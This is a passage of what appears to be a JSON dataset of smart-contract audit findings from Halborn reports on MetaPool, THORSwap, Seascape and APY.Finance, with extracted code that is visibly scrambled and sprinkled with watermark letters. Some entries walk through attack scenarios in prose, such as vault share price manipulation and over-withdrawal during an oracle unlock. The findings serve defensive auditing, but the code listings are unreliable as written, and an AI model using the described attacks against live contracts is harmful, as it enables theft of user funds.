        "body": "It was observed that creating a kick-starter in KatherineFundraising contract requires the caller to send arguments of type u64. The contract is interacted with by JavaScript API directly or indirectly via near-cli. JavaScript does not support the whole range of u64 type, and the max value that could be represented with precision is equal to 2**53 - 1. Providing a value higher than that one will result in imprecise representation (the actual value would be different from what the user supplied) or in error. It is worth noting that values that could be impacted by this finding are associated with timestamps, and it is implausible for regular interaction to require supplying values that could break this functionality. Code Location: Listing (Line 7) 11: contracts/katherine-fundraising-contract/src/types.rs 7 pub type EpochMillis = u64 ; Exemplary usage of EpochMillis type as user-facing function: Listing 12: contracts/katherine-fundraising-contract/src/lib.rs (Lines 338,339) 333 pub fn create_kickstarter ( 334 335 336 337 338 339 & mut self , name : String , slug : String , owner_id : AccountId , open_timestamp : EpochMillis , close_timestamp : EpochMillis , 53 token_contract_address : AccountId , deposits_hard_cap : U128 , max_tokens_to_release_per_stnear : U128 , token_contract_decimals : u8 , self . assert_only_owner () ; self . assert_unique_slug (& slug ); let id = self . kickstarters . len () as KickstarterId ; self . internal_create_kickstarter ( 340 341 342 343 344 ) -> KickstarterId { 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 } ) id , name , slug , owner_id , open_timestamp , close_timestamp , token_contract_address , deposits_hard_cap , max_tokens_to_release_per_stnear , token_contract_decimals BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to convert u64 into NEARs U64 type. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit ecaf7820 by changing the u64 type to U64 json-compatible type. 54 4.10 (HAL-10) POSSIBLE OPTIMIZATIONS TO REDUCE BINARY SIZE - INFORMATIONAL (0.0) ",
        "labels": [
            "Halborn",
            "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR",
            "Severity: Informational"
        ]
    },
    {
        "title": "INITIAL vTHOR SHARE PRICE MANIPULATION EXPOSURE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "After deployment, the vTHOR contract is initialed without seeding liquidity, exposing the vault to share price manipulation attacks. Proof of Concept: 1. The vTHOR contract is deployed by the THORSwap team. 2. An attacker finds the vTHOR contract before anyone can deposit their tokens. 3. The attacker deposits 1 token, for which they receive 1 share. This transaction sets the share price at 1 token/share. 4. The attacker then transfers an additional 999 tokens to the vTHOR This transaction increases the share price to 1000 contract. tokens/share. 5. A victim user finds the vTHOR contract and deposits 1500 tokens. Due to the integer rounding, the user only receives 1 share. This transaction modifies the share price to 1250 tokens/share. 6. The attacker then, withdraws from the contract using the redeem function. Depending on the distribution of shares, they will receive 1250 tokens, of which 250 will belong to the victim user. We note that the impact and likelihood of the vulnerability are low because the attacker has limited opportunity to exploit the issue. However, contract developers must be aware of the initial exposure to prevent potential damage. Risk Level: Likelihood - 1 Impact - 3 12 Recommendation: One of the possible solutions to avoid the price manipulation attack is to lock some tokens in the contract and then manually validate the share price before the vTHOR contract is made public. Remediation Plan: RISK ACCEPTED: The THORSwap team accept the risk of this finding and will deploy vTHOR and deposit THOR from treasury first to mitigate the issue. 13 ",
        "labels": [
            "Halborn",
            "THORSwap_Aggregators",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The vTHOR contract missed the nonReentrant guard in the deposit, mint , withdraw and redeem public functions. Even if the functions follow the check-effects-interactions pattern, we recommend using a mutex to be protected against cross-function reentrancy attacks. By using this lock, an attacker can no longer exploit the function with a recursive call. Note that the vTHOR contract included a mutex implementation called ReentrancyGuard, which provides a modifier to any function called nonReentrant that guards with a mutex against reentrancy attacks. However, the modifier is not used within the contract. Code Location: Listing 1: vTHOR.sol require (( shares = previewDeposit ( assets )) != 0, \" ZERO_SHARES \" ) // Check for rounding error since we round down in // Need to transfer before minting or ERC777s could reenter . address ( _asset ). safeTransferFrom ( msg . sender , address ( this ) , 73 function deposit ( uint256 assets , address receiver ) public returns  ( uint256 shares ) { 74  previewDeposit . 75  ; 76 77  assets ); 78 79 80 } 81 82 function mint ( uint256 shares , address receiver ) public returns (  uint256 assets ) { 83  error , previewMint rounds up . 84 85 // Need to transfer before minting or ERC777s could reenter . address ( _asset ). safeTransferFrom ( msg . sender , address ( this ) , _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); assets = previewMint ( shares ); // No need to check for rounding 14 _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); if ( msg . sender != owner ) { uint256 assets , address receiver , address owner  assets ); 86 87 88 } 89 90 function withdraw ( 91 92 93 94 ) public returns ( uint256 shares ) { 95  rounding error , previewWithdraw rounds up . 96 97  gas for limited approvals . 98  sender ] = allowed - shares ; 99 100 101 102 103 } 104 105 function redeem ( 106 107 108 109 ) public returns ( uint256 assets ) { 110 111 uint256 shares , address receiver , address owner if ( msg . sender != owner ) { shares = previewWithdraw ( assets ); // No need to check for uint256 allowed = allowance [ owner ][ msg . sender ]; // Saves if ( allowed != type ( uint256 ). max ) allowance [ owner ][ msg . } _burn ( owner , shares ); emit Withdraw ( msg . sender , receiver , owner , assets , shares ); address ( _asset ). safeTransfer ( receiver , assets ); uint256 allowed = allowance [ owner ][ msg . sender ]; // Saves  gas for limited approvals . 112 if ( allowed != type ( uint256 ). max ) allowance [ owner ][ msg .  sender ] = allowed - shares ; 113 114 } // Check for rounding error since we round down in  previewRedeem . 115 116 117 118 119 } require (( assets = previewRedeem ( shares )) != 0, \" ZERO_ASSETS \"); _burn ( owner , shares ); emit Withdraw ( msg . sender , receiver , owner , assets , shares ); address ( _asset ). safeTransfer ( receiver , assets ); 15 Risk Level: Likelihood - 1 Impact - 3 Recommendation: We recommend using ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The THORSwap team added the nonReentrant modifier to the deposit, mint, withdraw and redeem functions. 16 ",
        "labels": [
            "Halborn",
            "THORSwap_Aggregators",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/THORSwap_Aggregators_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Owners and TSAggregator contracts there are management functions marked as public, but they are never directly called within the contract itself or in any of its descendants:  setOwner(address owner, bool active)public virtual isOwner (Owners.sol#19)  setFee(uint256 _fee, address _feeRecipient)public (TSAggregator.sol#26) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by descendants, it is better to mark them as external to reduce gas costs. Remediation Plan: SOLVED: The THORSwap team marked the setOwner and setFee functions as external. 17 ",
        "labels": [
            "Halborn",
            "THORSwap_Aggregators",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING TOKEN DECIMALS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The newPeriod function under the StakeToken contract and the constructor of the SingleTokenChallenge and NftTokenChallenge contracts do not check for their decimals being the same as the SCALED factor. If a token whose decimals are != 18 will cause the staking period calculations to be wrong, including the rewards. Code Location: Listing 1: contracts/defi/StakeToken.sol (Lines 43,44) 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 function newPeriod ( uint256 key , address stakeToken , address rewardToken , uint256 startTime , uint256 endTime , uint256 rewardPool ) { } external newStakePeriod ( key , startTime , endTime , rewardPool ); // Challenge . stake is not null , means that earn is not null too . Period storage period period . stakeToken period . rewardToken = periods [ msg . sender ][ key ]; = stakeToken ; = rewardToken ; emit NewPeriod ( msg . sender , key , stakeToken , rewardToken , startTime , endTime ); 15 Listing 2: contracts/game_5/challenges/SingleTokenChallenge.sol (Lines 78,79) 74 constructor ( address _zombieFarm , address _vault , address _stake , address _reward , address _stakeHandler ) VaultHandler ( _vault ) public { require ( _zombieFarm != address (0) , \" invalid _zombieFarm address \" ); zombieFarm stakeToken rewardToken stakeHandler = _zombieFarm ; = _stake ; = _reward ; = _stakeHandler ; initReentrancyStatus () ; } 75 76 77 78 79 80 81 82 83 Listing 3: 91) contracts/game_5/challenges/NftTokenChallenges.sol (Lines 84 constructor ( address _zombieFarm , address _vault , address _nft , address _stake , address _reward , address _stakeHandler ) VaultHandler ( _vault ) public { require ( _zombieFarm != address (0) , \" invalid _zombieFarm address \" ); require ( _nft failed \" ); zombieFarm stakeToken nft rewardToken stakeHandler != address (0) , \" data . stake verification = _zombieFarm ; = _stake ; = _nft ; = _reward ; = _stakeHandler ; initReentrancyStatus () ; } 85 86 87 88 89 90 91 92 93 94 95 Risk Level: Likelihood - 3 Impact - 5 16 Recommendation: The code on newPeriod creation must check for both stakeToken and rewardToken decimals to be 18 the same as SCALED under Stake contract. Remediation Plan: SOLVED: The code now checks for the token decimals on all the aforementioned contracts. 17 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: High"
        ]
    },
    {
        "title": "MISSING SUPPORT FOR DEFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The transferFromVaultToUser function under the VaultHandler contract does not check the difference between the transferred before/after balance. The transferFromUserToVault does perform this check, but the return value is never checked. Not checking those values could cause the rewards to have discrepancy with the actual staked amount of tokens. Code Location: Listing 4: contracts/defi/StakeToken.sol (Lines 29,33,46) 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 function transferFromUserToVault ( address token , uint256 amount , address user ) internal returns ( uint256 ) { if ( token == address (0) ) { require ( msg . value >= amount , \" VAULT_HANDLER : not enough native token \" ); return msg . value ; } IERC20 _token = IERC20 ( token ); require ( _token . balanceOf ( user ) >= amount , \" VAULT_HANDLER : user has not enough token \" ); uint256 preTotalAmount = _token . balanceOf ( vault ); _token . safeTransferFrom ( user , vault , amount ); uint256 actualAmount = _token . balanceOf ( vault ) - preTotalAmount ; return actualAmount ; } function transferFromVaultToUser ( address token , uint256 amount , address user ) internal returns ( uint256 ) { if ( token == address (0) ) { payable ( user ). transfer ( amount ); 18 41 42 43 44 45 46 47 48 49 return amount ; } IERC20 _token = IERC20 ( token ); require ( _token . balanceOf ( vault ) >= amount , \" VAULT_HANDLER : vault has not enough token \"); _token . safeTransferFrom ( vault , user , amount ); return amount ; } Risk Level: Likelihood - 3 Impact - 5 Recommendation: The code should check for the real deposited amount and not rely on the function call parameter. If the changes are not made, the Seascape team should make sure that the provided tokens for staking/reward are not deflationary. Remediation Plan: RISK ACCEPTED: The SeaScape team accepts the risk on this finding. 19 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: High"
        ]
    },
    {
        "title": "CREATED SESSIONS CAN OVERLAP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The startSession function under the ZombieFarm contract does not check for the previous session id end time and allows creating a session whose start time is in the middle of the previous session period. Risk Level: Likelihood - 2 Impact - 5 Recommendation: The code should check that the created session is not inside the previous session by checking the startTime of the new session to be bigger than the last session endTime. Remediation Plan: SOLVED: The code now checks for isStarting during session start, which will prevent a new session to be started if a previous was already started (even if not active). 20 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Medium"
        ]
    },
    {
        "title": "INVALID PERIOD CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The getPeriodTime function does always report endTime if the startTime is in the future. This can cause all reward and claims to be treated as if the period was finished. If getPeriodTime is used inside a function that does not use the whenStakePeriodActive modifier, it will be vulnerable. Function using getPeriodTime are:  claimable: Since the staker deposit is only updated when inside the startTIme/endTime range, it will return 0 before even reaching the invalid getPeriodTime  updatePeriodClaimable (internal): Called using the updateRewardClaimable modifier. It is used on the deposit function after the Also used on the withdraw function that It is also called on whenStakePeriodActive. will fail since no deposit was made yet. reward function, but deposit is checked there for being not zero.  _reward (internal): The code does check staker.deposit == 0 which The deposit function will only change its value during deposit. does call whenStakePeriodActive. Code Location: Listing 5: contracts/defi/Stake.sol (Lines 267,278) 265 266 267 268 269 270 271 272 function getPeriodTime ( uint startTime , uint endTime ) internal view returns ( uint ) { if (! isActive ( startTime , endTime )) { return endTime ; } return block . timestamp ; } 21 273 274 275 276 277 278 279 function isActive ( uint startTime , uint endTime ) internal view returns ( bool ) { if ( startTime == 0) { return false ; } return ( block . timestamp >= startTime && block . timestamp <= endTime ); } Risk Level: Likelihood - 2 Impact - 5 Recommendation: The getPeriodTime should not return endTime if the period hasnt started yet. All functions calling this method should make sure that the returned value is inside the period. Remediation Plan: SOLVED: The getPeriodTime function now checks for block.timestamp < startTime and reports startTime instead of endTime. 22 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Medium"
        ]
    },
    {
        "title": "INVALID REWARD AMOUNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If the reward is less than the difference between the start and end timestamps, the unit (reward per second) will always be 0. As an example, if the reward was 10000 and the timestamp diff was 1641929035 - 1441929035 (200000000) the unit value would be 0 causing all the reward calculations to not increase. When the unit value is used it gets factored against the SCALED variable, this means that the unit value itself should be stored SCALED already and not rely on lazy escalation. Code Location: Listing 6: contracts/defi/Stake.sol (Lines 85) 71 72 73 74 75 76 77 78 // a unique identifier . could be a function newStakePeriod ( uint key , session id . uint startTime , uint endTime , uint rewardPool ) internal validStakePeriodParams ( key , startTime , endTime , rewardPool ) 23 79 80 81 82 83 84 85 86 87 88 89 { } // Challenge . stake is not null , means that earn is not null too . StakePeriod storage period = stakePeriods [ msg . sender ][ key ]; period . rewardPool period . startTime period . endTime period . unit startTime ); = rewardPool ; = startTime ; = endTime ; = rewardPool / ( endTime - period . rewardClaimableTime = startTime ; emit NewStakePeriod ( msg . sender , key , startTime , endTime ); Risk Level: Likelihood - 2 Impact - 5 Recommendations: It is recommended that the stored period.unit value is scaled by SCALER factor during declaration and not when used. Remediation Plan: SOLVED: The code now stores the unit value scaled with the SCALER factor. 24 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Medium"
        ]
    },
    {
        "title": "REWARD NFT RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The addLevelRewardToSession under the ZombieFarm does allow setting the same _data.imgId to multiple levelIds including the Grand reward. This will deny the prize to be collected since it was already collected on a previous level. Risk Level: Likelihood - 2 Impact - 4 Recommendations: The code should check for ID duplication on the _data parameters of the AddLevelToSession function under ScapeNftReward contract. Remediation Plan: NOT APPLICABLE: The team states that: The imgId passed as a reward is a metadata ticker. It is not an identifier of NFT. When the reward is claimed, the ZombieFarm will call a factory by passing metadata, so that factory will mint a new NFT and generate a new id for that NFT. 25 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Medium"
        ]
    },
    {
        "title": "SESSION DUPLICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The value startTime = 0 is allowed under the validStakePeriodParams modifier, bypassing the existence check and creating a duplicated session ID. Code Location: Listing 7: contracts/defi/Stake.sol (Lines 45) 45 46 47 48 49 50 modifier validStakePeriodParams ( uint key , uint startTime , uint endTime , uint rewardPool ) { require ( startTime < endTime , STAKE_TOKEN : invalid_time \" ); require ( rewardPool > 0, STAKE_TOKEN : zero_value \" ); require ( stakePeriods [ msg . sender ][ key ]. startTime == 0 , STAKE_TOKEN : period_exists \" ); _ ; } \" \" \" Risk Level: Likelihood - 1 Impact - 5 Recommendation: Although the check is performed on the call stack parent, it is recommended to perform all check on the call stack leaf so extreme scenarios are not The validStakePeriodParams modifier should either check for missed. startTime != 0 or use endTime for the period_exists check. 26 Remediation Plan: SOLVED: The check was added to the validStakePeriodParams modifier. The modifier now enforces that startTime >= block.timestamp. 27 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNUSED AND UNVERIFIED VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the ZombieFarm contract inside the startSession function, the grand reward variable is not used and not verified for being a valid reward. Since this value cannot be changed, this can lead to the grand reward not claimable. Code Location: Listing 8: contracts/game_5/ZombieFarm.sol (Lines 166,169) function startSession ( startTime , period , levelAmount , speedUpFee , repickFee , grandReward uint256 uint256 uint8 uint256 uint256 address external onlyOwner ) { // // Verifying the Grand reward // require ( supportedRewards [ grandReward ], \" unsupported reward \" ); ZombieFarmRewardInterface reward = ZombieFarmRewardInterface ( grandReward ); // Check that Grand Reward is valid : the rewardData and reward id should be parsable . // require ( reward . isValidData ( rewardData ) , \" Invalid reward data \") ; 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 28 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to validate the given address and to verify that the given contract does conform to the casted interface. Remediation Plan: RISK ACCEPTED: The SeaScape team accepts the risk on this finding. 29 ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Low"
        ]
    },
    {
        "title": "INVALID REPORTED VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_ZombieFarm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The initiated function does report true even if the session is in the future and hasnt started yet: Code Location: Listing 9: contracts/defi/Stake.sol (Lines 298) 294 295 296 297 298 299 function initiated ( address namespace , uint key ) public view returns ( bool ) { if ( key == 0) return false ; StakePeriod storage period = stakePeriods [ namespace ][ key ]; return ( block . timestamp <= period . endTime ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: The function should check for the period.startTime and report true only if inside the startTime/endTime period. 30 Remediation Plan: ACKNOWLEDGED: The SeaScape team acknowledged this finding. 31 3.10 (HAL-10) MISSING ZERO CHECKS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Seascape_ZombieFarm",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO RESTRICTIONS TO COMPLETELY WITHDRAW FROM POOLS TO FUND LP SAFE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "When owner calls fundLpSafe function from PoolManager contract, its _fund function does not verify pools reserve before transferring stable coins to LP Safe, so pools can be completely emptied without restrictions. This situation could lead legitimate users are not able to redeem its stable coins timely, especially because pools refill operation must be done manually by PoolManager owner. The risk level for this finding increases because it also facilitates liquidity loss related attacks (see HAL-02). Category: Liquidity management vulnerabilities Code location: Listing 1: PoolManager.sol (Lines 147) { external override onlyOwner nonReentrant 137 function fundLpSafe ( ILpSafeFunder . PoolAmount [] memory poolAmounts ) 138 139 140 141 142 143 144 145 146 147 148 149 address lpSafeAddress = addressRegistry . lpSafeAddress () ; require ( lpSafeAddress != address (0) , \" INVALID_LP_SAFE \" ); ( PoolTokenV2 [] memory pools , uint256 [] memory amounts ) = _getPoolsAndAmounts ( poolAmounts ); _fund ( lpSafeAddress , pools , amounts ); _registerPoolUnderlyers ( lpSafeAddress , pools ); } 20 S R O T C A F K S I R D E S A B L O C O T O R P Listing 2: PoolManager.sol (Lines 221) 202 function _fund ( 203 204 205 206 207 ) internal { address account , PoolTokenV2 [] memory pools , uint256 [] memory amounts MetaPoolToken mApt = MetaPoolToken ( addressRegistry . 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 mAptAddress () ); uint256 [] memory mintAmounts = new uint256 []( pools . length ) ; for ( uint256 i = 0; i < pools . length ; i ++) { PoolTokenV2 pool = pools [ i ]; uint256 poolAmount = amounts [i ]; require ( poolAmount > 0, \" INVALID_AMOUNT \"); IDetailedERC20 underlyer = pool . underlyer () ; uint256 tokenPrice = pool . getUnderlyerPrice () ; uint8 decimals = underlyer . decimals () ; uint256 mintAmount = mApt . calculateMintAmount ( poolAmount , tokenPrice , decimals ); mintAmounts [i ] = mintAmount ; underlyer . safeTransferFrom ( address ( pool ) , account , poolAmount ); } Risk Level: Likelihood - 3 Impact - 3 Recommendations: Implement a security mechanism that automatically calculates the maximum amount of stable coins that can be withdrawn from pools to fund LP Safe without compromising the reserves. Revert the operation if PoolManager owner tries to withdraw more than allowed. 21 S R O T C A F K S I R D E S A B L O C O T O R P Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. The fundLp function from MetaPoolToken contract automatically calculates the amount of extra reserves and only transfer that extra amount, it no longer takes a parameter to specify any arbitrary amount. On the other hand, the emergencyFundLp function that can transfer from the pools without restriction is protected by onlyEmergencyRole modifier. S R O T C A F K S I R D E S A B L O C O T O R P 22 ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNRESTRICTED CAPACITY TO TRANSFER STABLE COINS FROM LP SAFE TO EXTERNAL ACCOUNTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "Due to the design of APY.Finance platform, PoolManager owner periodically funds a special Gnosis Safe wallet - called LP Safe - that has unrestricted capacity to transfer its whole balance to a (potentially malicious) external account. The risk level for this finding increases because is possible to empty all pools without restrictions, see HAL-01. Attack scenario: 1. PoolManager owner funds LP Safe with the whole balance from all pools (see HAL-01 finding). 2. If not appropriately configured, LP Safe can use Gnosis Safes Multisend transaction builder to transfer its whole own balance to a malicious external account. 3. Legitimate users will not be able to redeem its stable coins anymore. Category: Liquidity loss exposure Code location: Not applicable for a specific smart contract. Some referential images will be shown to highlight Gnosis Safe functionalities that facilitates to transfer (unrestrictedly) stable coins to external accounts. Referential image of Gnosis Safes Multisend transaction builder that allows to build multiple transactions at once from a smart contract: 23 S R O T C A F K S I R D E S A B L O C O T O R P S R O T C A F K S I R D E S A B L O C O T O R P Referential image that shows Gnosis Safe capacity to send multiple transactions by signing just once: Risk Level: Likelihood - 3 Impact - 5 24 Recommendations: Short term security measures to reduce risk level for this finding:  Solve HAL-01 finding: No restrictions to completely withdraw from pools to fund LP Safe.  Configure LP Safes Owners section to have a reasonable number of owners and Policies section to have an appropriate number of required confirmations to transact. Long term security measures to reduce risk level for this finding:  Deploy a proxy smart contract, owned by LP Safe, that interacts with all DeFi protocols used by APY.Finance for yield farming.  Establish decentralized government to upgrade the interactions with those DeFi protocols or new ones. Remediation plan: SOLVED: Issue fixed in commit 35fca40b1d873609a96b09440afc7676666e111d. APY.Finance team implemented a proxy contract called LpAccount. This contract holds all the funds and allows the more restrictive admin Safe to register zap contracts. These zap contracts have a consistent interface and define the logic used to interact with external protocols. The LpAccount contract can perform a delegate call to these registered zap contracts to deploy, unwind, or swap assets. The configuration of the zap contracts uses hardcoded constants to prevent a malicious user that has compromised the controlling Safe from passing in their own addresses or parameters that could cause a loss of funds. 25 S R O T C A F K S I R D E S A B L O C O T O R P TRANSACTION BASED RISK FACTORS 26 ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: High"
        ]
    },
    {
        "title": "INADEQUATE SEGREGATION OF DUTIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "Due to the design of APY.Finance platform, owners of contracts can carry out different kind of operations:  Day-to-day operations: Fund LP Safe, add asset allocation, etc.  Interaction with external DeFi protocols: Deploy strategy, unwind strategy.  Emergency operations: Set TVL value manually, set TVL aggregator source, etc. For each kind of operation should exist a different role to reduce the risk of operational mistakes or attacker lateral movement if one of the roles has been already compromised. The risk level for this finding increases because it also facilitates another attacks (see HAL-04, HAL-05 and HAL-07). Category: Governance issues Code location: Not applicable for a specific smart contract. Risk Level: Likelihood - 4 Impact - 3 27 S R O T C A F K S I R D E S A B N O I T C A S N A R T Recommendations: Security measures to reduce risk level for this finding:  Define clearly what functions of APY.Finance protocol should be assigned to each kind of operation.  Create different roles for each kind of operation: day-to-day ops, interaction with external DeFi protocols and emergency ops.  Each role must be associated to a multisig wallet and preferably managed by different owners.  Configure multisig wallets to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: SOLVED: Issue fixed in commit ab6e8837290b4646827cf5391cdfa75d726c3f1a. APY.Finance team solved this finding by switching from simple contract ownership to role based access control and implementation of this uses the existing OpenZeppelin AccessControl contract. Roles were segregated into three categories, each controlled by a different Gnosis Safe:  LP Role: This role is for day to day management of liquidity and is controlled by the LP Safe.  Admin Role: This role is for configuration that needs to be protected because a malicious actor could use the functions to cause a loss of funds. This is separate from the LP role, so APY.Finance can use a much more restrictive Gnosis Safe. The functions this role protects are not so time-sensitive, so the proper oversight with many signers can be applied. An example is the registration of new LP Account zaps.  Emergency Role: This role is the most restrictive and protects functions that should never be called during normal operation of the system. These functions are powerful and should only be used as a fail-safe in 28 S R O T C A F K S I R D E S A B N O I T C A S N A R T the event of an emergency. All functions protected by the emergency role are labeled with the prefix emergency in addition to the onlyEmergencyRole modifier. The big distinction between this and the admin role is that the admin role protects functions that can be used during normal operations. S R O T C A F K S I R D E S A B N O I T C A S N A R T 29 INTERNAL BASED RISK FACTORS 30 ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "ABSENCE OF TIMELOCK MECHANISM WHEN UPGRADING SYSTEM LOGIC / PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "APY.Finance protocol does not have a timelock set on their smart contracts, so most owner interactions with the contracts allow him to make large changes to contract configuration (logic / parameters) with no delays or warnings. Due to operational mistakes or by means of attacks, TVL or prices could be dramatically changed and creates a great imbalance on stable coin / APT ratio. This situation would allow users to deposit or withdraw more or less than their fair share, without enough time for APY.Finance team to react against the issue. Category: Timelock risks Code location: Applicable for all smart contracts within scope. The following are some examples of timelocks used on another protocols: Listing 3 1 MakerDAO - 4 hours timelock 2 Uniswap - 48 hours timelock 3 SushiSwap - 48 hours timelock 31 S R O T C A F K S I R D E S A B L A N R E T N I Risk Level: Likelihood - 3 Impact - 3 Recommendations: Security measures to reduce risk level for this finding:  Set a timelock by code. Once set, no one can reduce the waiting time unless using a governance system or an emergency role. You can take the examples provided above as a reference.  For an adequate segregation of duties, create an emergency role (multisig wallet) to manage large changes to contract configuration. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe).  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: PARTIALLY SOLVED: APY.Finance team implemented part of the suggested remediation to have critical configuration protected by a segregated role (Emergency Role) that uses a more restrictive Safe. This provides more oversight and reduce the likelihood that major changes happens instantly. 32 S R O T C A F K S I R D E S A B L A N R E T N I ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "EARLY UNLOCKING OF ORACLE ADAPTER COULD LEAD TO UNFAIR WITHDRAWING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "The unlock function from OracleAdapter contract can be called by some permissioned accounts. However, if it is called just after withdrawing LP Safe, TVL value is miscalculated (deployed value is considered twice) and creates a time window where attackers and legitimate users as well can withdraw much more than allowed from pools. Attack scenario: A step-by-step attack scenario will be described along with screenshots extracted from proof of concept (PoC) script, which is included on security-assessment/tvl_not_updated.js file as an attachment for this report. 1. Attacker deposits its stable coins into a pool. 2. PoolManager contract owner withdraws from LP Safe and mistakenly unlocks OracleAdapter before TVL value is updated by oracles. 33 S R O T C A F K S I R D E S A B L A N R E T N I 3. We can see that attacker deposited 1M DAI but is able to withdraw more than 1.39M DAI, which represents a 39% excedent. While TVL value has not been updated by oracles, this vulnerability can be exploited by attackers and legitimate users as well. Category: Timelock risks Code location: Listing 4: OracleAdapter.sol 125 function unlock () external override onlyPermissioned { 126 127 } lockFor (0) ; Risk Level: Likelihood - 4 Impact - 4 S R O T C A F K S I R D E S A B L A N R E T N I 34 Recommendations: Security measures to reduce risk level for this finding:  Add a mutex for unlock function. As a reference, you can use a mutex based on roundId value returned by TVL aggregator, so nobody can unlock OracleAdapter while roundId has not been incremented with respect to its previous value (before locking). This locking could be reverted on emergency situations using lockFor function.  For an adequate segregation of duties, create an emergency role (multisig wallet) to unlock OracleAdapter on emergency situations. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe).  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. S R O T C A F K S I R D E S A B L A N R E T N I Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. The unlock function 